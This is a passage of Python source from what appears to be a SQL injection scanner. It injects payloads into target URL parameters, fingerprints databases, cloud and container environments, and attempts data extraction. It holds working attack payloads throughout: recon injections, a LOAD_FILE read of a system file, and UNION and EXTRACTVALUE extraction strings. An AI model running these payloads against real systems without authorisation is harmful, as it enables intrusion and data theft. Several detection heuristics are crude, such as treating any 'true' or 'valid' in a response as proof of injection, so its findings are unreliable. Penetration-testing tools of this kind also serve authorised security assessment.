        if not response_data:
            return False
        
        content = response_data.get('content', '')
        
        try:
            json_response = json.loads(content)
            
            if 'errors' in json_response:
                errors = json_response['errors']
                for error in errors:
                    error_msg = str(error.get('message', '')).lower()
                    if any(indicator in error_msg for indicator in ['sql', 'syntax', 'database', 'query']):
                        return True
            
            if 'data' in json_response and json_response['data']:
                return True
                    
        except json.JSONDecodeError:
            pass
        
        return False

    def _analyze_ai_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for AI/ML injection indicators."""
        if not response_data:
            return False
        
        content = response_data.get('content', '').lower()
        
        ai_indicators = [
            'vector', 'embedding', 'similarity', 'training_data', 'model',
            'pinecone', 'weaviate', 'qdrant', 'dimension', 'cosine', 'euclidean'
        ]
        
        for indicator in ai_indicators:
            if indicator in content:
                return True
        
        if response_data.get('status_code') in [400, 500]:
            if any(term in content for term in ['vector', 'dimension', 'embedding']):
                return True
                
        return False

    def _analyze_exfiltration_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for data exfiltration indicators."""
        if not response_data:
            return False
        
        content = response_data.get('content', '').lower()
        
        exfil_indicators = [
            'outfile', 'into_outfile', 'load_data', 'select_into', 'dns', 'exfil', 'callback'
        ]
        
        for indicator in exfil_indicators:
            if indicator in content:
                return True
        
        if 'query ok' in content or '1 row affected' in content:
            return True
            
        return False

    def _analyze_container_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for container escape indicators."""
        if not response_data:
            return False
        
        content = response_data.get('content', '').lower()
        
        container_indicators = [
            '/proc/self/cgroup', 'docker', 'container', 'kubernetes', 'k8s'
        ]
        
        for indicator in container_indicators:
            if indicator in content:
                return True
                
        return False

    def _analyze_lambda_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for Lambda/serverless injection indicators."""
        if not response_data:
            return False
        
        content = response_data.get('content', '').lower()
        
        lambda_indicators = [
            'lambda', 'aws', 'serverless', 'function', 'cloudwatch', 'sqs'
        ]
        
        for indicator in lambda_indicators:
            if indicator in content:
                return True
                
        return False

    def _analyze_response(self, 
                         response_data: Dict[str, Any],
                         payload: str,
                         technique: DetectionTechnique,
                         injection_point: InjectionPoint,
                         tech_context: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze response for SQL injection indicators with modern context."""
        
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'technique': technique,
            'database_type': None,
            'metadata': tech_context
        }
        
        if not response_data:
            return result
        
        content = response_data.get('content', '')
        timing = response_data.get('timing', 0.0)
        
        # Traditional analysis
        if technique == DetectionTechnique.ERROR_BASED:
            self._analyze_error_based(content, payload, result)
        elif technique == DetectionTechnique.TIME_BASED:
            self._analyze_time_based(timing, payload, result)
        elif technique == DetectionTechnique.BOOLEAN_BLIND:
            self._analyze_boolean_blind(content, payload, result)
        elif technique == DetectionTechnique.UNION_BASED:
            self._analyze_union_based(content, payload, result)
        elif technique == DetectionTechnique.STACKED_QUERIES:
            self._analyze_stacked_queries(content, payload, result)
        
        # Enhanced database fingerprinting with modern context
        if result['vulnerable']:
            result['database_type'] = self._detect_database_from_response(content, tech_context)
        
        return result

    def _detect_database_from_response(self, content: str, tech_context: Dict) -> Optional[DatabaseType]:
        """Detect database type from response content with modern context."""
        
        # Use technology context if available
        detected_db = tech_context.get('database_type')
        if detected_db:
            return detected_db
        
        # Traditional fingerprinting
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return db_type
        
        return DatabaseType.UNKNOWN

    async def _detect_technology_stack(self, injection_point: InjectionPoint, config: ScanConfiguration) -> Dict[str, Any]:
        """Detect modern technology stack and frameworks."""
        
        detection_results = {
            'database_type': None,
            'orm_framework': None,
            'cloud_provider': None,
            'api_type': None,
            'ai_ml_indicators': False,
            'container_env': False,
            'modern_features': []
        }
        
        # Send reconnaissance payloads
        recon_payloads = [
            # Database version detection
            "' AND (SELECT @@version) LIKE '%8.%' --",  # MySQL 8+
            "' AND version() LIKE '%17.%' --",          # PostgreSQL 17+
            
            # NoSQL detection
            '{"$where": "1==1"}',
            '{"test": {"$ne": null}}',
            
            # Cloud provider detection
            "' AND @@hostname LIKE '%aws%' --",
            "' AND @@hostname LIKE '%azure%' --",
            
            # Container detection
            "'; SELECT LOAD_FILE('/proc/self/cgroup'); --",
            
            # AI/ML detection
            "' AND table_name LIKE '%vector%' FROM information_schema.tables --",
            "' AND table_name LIKE '%embedding%' FROM information_schema.tables --"
        ]
        
        for payload in recon_payloads:
            try:
                response_data = await self._send_payload_request(injection_point, payload, config)
                if response_data:
                    self._analyze_technology_response(response_data, detection_results)
            except Exception:
                continue
        
        return detection_results
    
    def _analyze_technology_response(self, response_data: Dict, detection_results: Dict):
        """Analyze response to detect technology stack."""
        content = response_data.get('content', '').lower()
        
        # Database version detection
        if 'mysql' in content and ('8.' in content or '5.7' in content):
            detection_results['database_type'] = DatabaseType.MYSQL_8
        elif 'postgresql' in content and ('17.' in content or '16.' in content):
            detection_results['database_type'] = DatabaseType.POSTGRESQL_17
        
        # NoSQL detection
        if any(term in content for term in ['mongodb', 'bson', 'objectid']):
            detection_results['database_type'] = DatabaseType.MONGODB
        
        # Cloud provider detection
        if any(term in content for term in ['aws', 'amazon', 'rds']):
            detection_results['cloud_provider'] = 'aws'
        elif any(term in content for term in ['azure', 'microsoft']):
            detection_results['cloud_provider'] = 'azure'
        elif any(term in content for term in ['google', 'gcp']):
            detection_results['cloud_provider'] = 'gcp'
        
        # AI/ML indicators
        if any(term in content for term in ['vector', 'embedding', 'similarity', 'ml', 'ai']):
            detection_results['ai_ml_indicators'] = True
        
        # Container detection
        if any(term in content for term in ['docker', 'container', '/proc/self/cgroup']):
            detection_results['container_env'] = True

    def get_scan_statistics(self) -> Dict[str, Any]:
        """Get comprehensive scan statistics."""
        return {
            **self.scan_stats,
            'techniques_used': list(self.scan_stats['techniques_used']),
            'requests_per_second': (
                self.scan_stats['total_requests'] / self.scan_stats['scan_duration']
                if self.scan_stats['scan_duration'] > 0 else 0
            )
        } 

    def _analyze_error_based(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for error-based SQL injection."""
        
        # Check for database-specific errors
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    result['vulnerable'] = True
                    result['confidence'] += 0.3
                    result['evidence'].append(f"Database error detected: {pattern[:50]}...")
                    result['database_type'] = db_type
        
        # Check for generic SQL errors
        generic_patterns = [
            r'SQL syntax.*error',
            r'syntax error',
            r'unexpected.*token',
            r'division by zero',
            r'invalid.*query'
        ]
        
        for pattern in generic_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.2
                result['evidence'].append(f"SQL error pattern: {pattern}")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_time_based(self, timing: float, payload: str, result: Dict) -> Dict:
        """Analyze response for time-based SQL injection."""
        
        time_threshold = 3.0  # seconds
        
        if timing >= time_threshold:
            result['vulnerable'] = True
            result['evidence'].append(f"Response delay: {timing:.2f}s (threshold: {time_threshold}s)")
            
            # Calculate confidence based on delay
            if timing >= time_threshold * 2:
                result['confidence'] = 0.9
            elif timing >= time_threshold * 1.5:
                result['confidence'] = 0.7
            else:
                result['confidence'] = 0.5
            
            # Check for time-based functions in payload
            time_functions = ['sleep', 'delay', 'waitfor', 'benchmark', 'pg_sleep']
            for func in time_functions:
                if func.lower() in payload.lower():
                    result['evidence'].append(f"Time-based function used: {func}")
                    result['confidence'] += 0.1
                    break
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_boolean_blind(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for boolean-based blind SQL injection."""
        
        # Simple heuristics for boolean detection
        # In real implementation, this would compare with baseline responses
        
        # Check for boolean indicators
        boolean_indicators = ['true', 'false', 'success', 'failed', 'valid', 'invalid']
        for indicator in boolean_indicators:
            if indicator.lower() in content.lower():
                result['vulnerable'] = True
                result['confidence'] += 0.2
                result['evidence'].append(f"Boolean indicator: {indicator}")
        
        # Check for conditional logic in payload
        if any(op in payload for op in ['AND', 'OR', '=', '>', '<']):
            result['confidence'] += 0.1
            result['evidence'].append("Conditional logic in payload")
        
        # Minimum confidence for boolean blind
        if result['vulnerable']:
            result['confidence'] = max(result['confidence'], 0.3)
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_union_based(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for UNION-based SQL injection."""
        
        # Check for UNION indicators
        union_patterns = [
            r'union.*select',
            r'order\s+by\s+\d+',
            r'null.*null.*null',
            r'@@version',
            r'database\(\)',
            r'user\(\)'
        ]
        
        for pattern in union_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.3
                result['evidence'].append(f"UNION indicator: {pattern}")
        
        # Check for data extraction patterns
        if any(keyword in content.lower() for keyword in ['mysql', 'postgresql', 'oracle', 'sql server']):
            result['confidence'] += 0.2
            result['evidence'].append("Database information detected")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    def _analyze_stacked_queries(self, content: str, payload: str, result: Dict) -> Dict:
        """Analyze response for stacked query SQL injection."""
        
        # Check for stacked query indicators
        if ';' in payload and any(keyword in payload.lower() 
                                for keyword in ['insert', 'update', 'delete', 'create', 'drop']):
            result['evidence'].append("Stacked query payload detected")
            result['confidence'] += 0.2
        
        # Check for execution indicators
        execution_patterns = [
            r'rows? affected',
            r'command completed',
            r'query executed'
        ]
        
        for pattern in execution_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                result['vulnerable'] = True
                result['confidence'] += 0.4
                result['evidence'].append(f"Execution indicator: {pattern}")
        
        result['confidence'] = min(result['confidence'], 1.0)
        return result
    
    async def _validate_vulnerability(self, 
                                    injection_point: InjectionPoint,
                                    result: Dict[str, Any],
                                    context: PayloadCraftingContext,
                                    config: ScanConfiguration) -> bool:
        """Validate vulnerability with additional payloads."""
        
        try:
            # Generate validation payloads
            crafting_technique = self._map_to_crafting_technique(result['technique'])
            validation_payloads = self.payload_engine.craft_payloads(
                injection_point,
                techniques=[crafting_technique],
                max_payloads=3
            )
            
            successful_validations = 0
            
            # Test validation payloads
            for payload_data in validation_payloads:
                payload, template = payload_data
                
                response_data = await self._send_payload_request(
                    injection_point, payload, config
                )
                
                if response_data:
                    validation_result = self._analyze_response(
                        response_data, payload, result['technique'], injection_point, {}
                    )
                    
                    if validation_result['vulnerable']:
                        successful_validations += 1
            
            # Require majority of validation tests to pass
            return successful_validations >= 2
            
        except Exception:
            return False

    async def _attempt_data_extraction(self, 
                                     injection_point: InjectionPoint,
                                     result: Dict[str, Any],
                                     context: PayloadCraftingContext,
                                     config: ScanConfiguration) -> Optional[str]:
        """Attempt to extract data from vulnerable parameter."""
        
        if result['technique'] not in [DetectionTechnique.UNION_BASED, DetectionTechnique.ERROR_BASED]:
            return None
        
        try:
            # Try to extract database version
            if result['technique'] == DetectionTechnique.UNION_BASED:
                # Simple UNION-based extraction
                union_payload = f"1 UNION SELECT @@version,NULL,NULL--"
                
                response_data = await self._send_payload_request(
                    injection_point, union_payload, config
                )
             
                if response_data:
                    content = response_data['content']
                    # Look for version information
                    version_patterns = [r'(\d+\.\d+\.\d+)', r'MySQL (\d+\.\d+)', r'PostgreSQL (\d+\.\d+)']
                    for pattern in version_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            return f"Database version: {matches[0]}"
            
            elif result['technique'] == DetectionTechnique.ERROR_BASED:
                # Error-based extraction
                error_payload = f"1 AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))"
                
                response_data = await self._send_payload_request(
                    injection_point, error_payload, config
                )
                
                if response_data:
                    content = response_data['content']
                    # Look for data between tildes
                    matches = re.findall(r'~([^~]+)~', content)
                    if matches:
                        return f"Extracted data: {matches[0]}"
        
        except Exception:
            pass
        
        return None

    async def _send_payload_request(self, 
                                  injection_point: InjectionPoint,
                                  payload: str,
                                  config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send HTTP request with SQL injection payload."""
        
        try:
            # Construct request based on injection point
            start_time = time.time()
            
            if injection_point.method.upper() == 'GET':
                url_parts = list(urllib.parse.urlparse(injection_point.url))
                query_params = urllib.parse.parse_qs(url_parts[4])
                query_params[injection_point.name] = [payload]
                url_parts[4] = urllib.parse.urlencode(query_params, doseq=True)
                test_url = urllib.parse.urlunparse(url_parts)
                
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    timing = time.time() - start_time
                    
                    return {
                        'content': content,
                        'timing': timing,
                        'headers': dict(response.headers),
                        'status_code': response.status
                    }
            
            elif injection_point.method.upper() == 'POST':
                data = {injection_point.name: payload}
                async with self.session.post(injection_point.url, data=data, 
                                           timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    timing = time.time() - start_time
                    
                    return {
                        'content': content,
                        'timing': timing,
                        'headers': dict(response.headers),
                        'status_code': response.status
                    }
            
        except asyncio.TimeoutError:
            # Timeout might indicate time-based injection
            return {
                'content': '',
                'timing': config.timeout,
                'headers': {},
                'status_code': 408
            }
        
        except Exception:
            return None

    def _select_techniques(self, 
                          injection_point: InjectionPoint,
                          config: ScanConfiguration,
                          tech_context: Dict[str, Any]) -> List[DetectionTechnique]:
        """Select appropriate detection techniques based on context and modern capabilities."""
        
        techniques = []
        
        # Traditional techniques first
        techniques.append(DetectionTechnique.ERROR_BASED)
        
        if injection_point.parameter_type in [ParameterType.NUMERIC, ParameterType.STRING]:
            techniques.append(DetectionTechnique.BOOLEAN_BLIND)
        
        if config.mode in [ScanMode.THOROUGH, ScanMode.AGGRESSIVE, ScanMode.MODERN_2025]:
            techniques.append(DetectionTechnique.TIME_BASED)
        
        if injection_point.method.upper() == 'GET':
            techniques.append(DetectionTechnique.UNION_BASED)
        
        if config.mode in [ScanMode.AGGRESSIVE, ScanMode.MODERN_2025]:
            techniques.append(DetectionTechnique.STACKED_QUERIES)
        
        # Modern 2025 techniques - now included in THOROUGH mode by default!
        if config.mode in [ScanMode.THOROUGH, ScanMode.AGGRESSIVE, ScanMode.MODERN_2025]:
            
            # NoSQL techniques if NoSQL database detected
            if tech_context.get('database_type') in [DatabaseType.MONGODB, DatabaseType.COUCHDB, DatabaseType.REDIS]:
                techniques.extend([
                    DetectionTechnique.NOSQL_JAVASCRIPT,
                    DetectionTechnique.NOSQL_OPERATOR
                ])
            
            # GraphQL techniques if GraphQL API detected
            if 'graphql' in str(injection_point.url).lower() or tech_context.get('api_type') == 'graphql':
                techniques.append(DetectionTechnique.GRAPHQL_INJECTION)
            
            # AI/ML techniques if AI indicators found
            if tech_context.get('ai_ml_indicators') or 'vector' in str(injection_point.url).lower():
                techniques.extend([
                    DetectionTechnique.AI_MODEL_INJECTION,
                    DetectionTechnique.VECTOR_SEARCH_INJECTION
                ])
            
            # Cloud-specific techniques
            if tech_context.get('cloud_provider'):
                techniques.append(DetectionTechnique.LAMBDA_INJECTION)
            
            # Container escape techniques if container environment detected
            if tech_context.get('container_env'):
                techniques.append(DetectionTechnique.CONTAINER_ESCAPE)
            
            # Always include DNS exfiltration in thorough scans (it's a universal technique)
            techniques.append(DetectionTechnique.DNS_EXFILTRATION)
        
        return techniques
    
    def _map_to_crafting_technique(self, detection_technique: DetectionTechnique) -> InjectionTechnique:
        """Map detection technique to payload crafting technique."""
        mapping = {
            DetectionTechnique.ERROR_BASED: InjectionTechnique.ERROR_BASED,
            DetectionTechnique.BOOLEAN_BLIND: InjectionTechnique.BOOLEAN_BASED,
            DetectionTechnique.TIME_BASED: InjectionTechnique.TIME_BASED,
            DetectionTechnique.UNION_BASED: InjectionTechnique.UNION_BASED,
            DetectionTechnique.STACKED_QUERIES: InjectionTechnique.STACKED_QUERIES
        }
        return mapping.get(detection_technique, InjectionTechnique.BOOLEAN_BASED)
    
    def _map_parameter_type(self, param_type: ParameterType) -> str:
        """Map injection point parameter type to crafting context type."""
        mapping = {
            ParameterType.NUMERIC: 'numeric',
            ParameterType.STRING: 'string',
            ParameterType.JSON_OBJECT: 'json',
            ParameterType.UNKNOWN: 'string'
        }
        return mapping.get(param_type, 'string')
    
    def _assess_exploitation_potential(self, result: Dict[str, Any]) -> str:
        """Assess exploitation potential based on detection result."""
        technique = result['technique']
        
        # Modern 2025 techniques
        if technique in [DetectionTechnique.AI_MODEL_INJECTION, DetectionTechnique.LAMBDA_INJECTION, 
                        DetectionTechnique.CONTAINER_ESCAPE, DetectionTechnique.DNS_EXFILTRATION]:
            return "Critical - Advanced 2025 attack vector with severe impact"
        elif technique in [DetectionTechnique.NOSQL_JAVASCRIPT, DetectionTechnique.GRAPHQL_INJECTION]:
            return "High - Modern application-layer injection possible"
        elif technique in [DetectionTechnique.NOSQL_OPERATOR, DetectionTechnique.VECTOR_SEARCH_INJECTION]:
            return "Medium-High - Modern database exploitation possible"
        
        # Traditional techniques
        elif technique == DetectionTechnique.UNION_BASED:
            return "High - Direct data extraction possible"
        elif technique == DetectionTechnique.ERROR_BASED:
            return "High - Error-based data extraction possible"
        elif technique == DetectionTechnique.BOOLEAN_BLIND:
            return "Medium - Blind data extraction possible"
        elif technique == DetectionTechnique.TIME_BASED:
            return "Medium - Time-based blind extraction possible"
        elif technique == DetectionTechnique.STACKED_QUERIES:
            return "Critical - Full database control possible"
        else:
            return "Unknown"
    
    def _calculate_risk_level(self, result: Dict[str, Any], injection_point: InjectionPoint) -> str:
        """Calculate risk level based on multiple factors including modern attack vectors."""
        base_risk = 0
        
        # Technique-based risk (enhanced for modern techniques)
        technique_risk = {
            # Critical modern techniques
            DetectionTechnique.AI_MODEL_INJECTION: 15,
            DetectionTechnique.LAMBDA_INJECTION: 15,
            DetectionTechnique.CONTAINER_ESCAPE: 15,
            DetectionTechnique.DNS_EXFILTRATION: 14,
            
            # Traditional critical techniques
            DetectionTechnique.STACKED_QUERIES: 10,
            
            # High-risk techniques
            DetectionTechnique.NOSQL_JAVASCRIPT: 9,
            DetectionTechnique.GRAPHQL_INJECTION: 9,
            DetectionTechnique.UNION_BASED: 9,
            DetectionTechnique.ERROR_BASED: 8,
            
            # Medium-risk techniques
            DetectionTechnique.NOSQL_OPERATOR: 7,
            DetectionTechnique.VECTOR_SEARCH_INJECTION: 7,
            DetectionTechnique.BOOLEAN_BLIND: 7,
            DetectionTechnique.TIME_BASED: 6
        }
        base_risk += technique_risk.get(result['technique'], 5)
        
        # Confidence-based risk
        base_risk += int(result['confidence'] * 5)
        
        # Parameter type risk
        if injection_point.parameter_type == ParameterType.NUMERIC:
            base_risk += 2
        
        # Method-based risk
        if injection_point.method.upper() == 'POST':
            base_risk += 1
        
        # Modern context risk multipliers
        metadata = result.get('metadata', {})
        if metadata.get('ai_attack'):
            base_risk += 3
        if metadata.get('container_attack'):
            base_risk += 3
        if metadata.get('serverless_attack'):
            base_risk += 2
        
        # Categorize risk
        if base_risk >= 18:
            return "Critical"
        elif base_risk >= 15:
            return "High"
        elif base_risk >= 8:
            return "Medium"
        else:
            return "Low" 